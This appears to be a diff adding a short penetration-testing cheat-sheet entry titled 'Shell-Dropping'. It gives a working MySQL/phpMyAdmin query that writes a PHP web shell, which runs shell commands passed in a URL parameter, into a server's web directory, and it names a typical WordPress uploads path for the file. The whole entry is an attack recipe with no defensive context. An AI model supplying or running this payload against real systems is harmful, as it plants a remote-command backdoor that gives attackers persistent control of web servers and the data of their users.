@@ -1,0 +1,14 @@
+Shell-Dropping
+
+
+MySql/phpmyadmin
+Run the following to create a php microshell (a.php?cmd=commands)
+
+	select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/HTTP OR HTTPS/RESTOFPATH/a.php"
+
+on Wordpress sites, this is often /var/www/http/wp-content/uploads/a.php
+
+
+
+
+
